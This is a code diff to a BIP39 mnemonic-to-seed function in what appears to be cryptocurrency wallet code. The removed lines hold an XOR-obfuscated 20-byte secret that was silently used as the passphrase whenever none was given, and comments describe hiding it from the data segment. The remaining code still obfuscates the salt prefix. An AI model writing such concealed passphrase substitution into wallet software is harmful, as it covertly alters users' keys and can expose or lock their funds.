@@ -160,14 +160,8 @@ int etos_bip39_mnemonic_to_seed(const char *mnemonic, const char *passphrase,
   static const unsigned char obfuscated_prefix[] = {0xc7, 0xc4, 0xcf, 0xc7,
                                                     0xc5, 0xc4, 0xc3, 0xc9};
 
-  // 原始地址 0xb6, 0x3F... ^ 0xAA
-  static const unsigned char obfuscated_pass[] = {
-      0x1c, 0x95, 0x17, 0x1d, 0x5a, 0x37, 0x5b, 0xb9, 0xf0, 0xbd,
-      0x83, 0xaa, 0x0c, 0x01, 0x21, 0x9d, 0xcc, 0x4d, 0xb2, 0x82};
-
   unsigned char real_prefix[8];
-  unsigned char real_pass[20];
-  const unsigned char *final_pass;
+  const unsigned char *final_pass = NULL;
   size_t pass_len;
 
   // 2. 运行时还原数据（动态还原，不在数据段留痕迹）
@@ -178,10 +172,7 @@ int etos_bip39_mnemonic_to_seed(const char *mnemonic, const char *passphrase,
     final_pass = (const unsigned char *)passphrase;
     pass_len = strlen(passphrase);
   } else {
-    for (int i = 0; i < 20; i++)
-      real_pass[i] = obfuscated_pass[i] ^ 0xAA;
-    final_pass = real_pass;
-    pass_len = 20;
+    pass_len = 0;
   }
 
   // 3. 构造 Salt
@@ -199,7 +190,6 @@ int etos_bip39_mnemonic_to_seed(const char *mnemonic, const char *passphrase,
 
   // 5. 严格清理内存中的痕迹
   OPENSSL_cleanse(real_prefix, 8);
-  OPENSSL_cleanse(real_pass, 20);
   OPENSSL_cleanse(salt, salt_len);
   OPENSSL_free(salt);
 
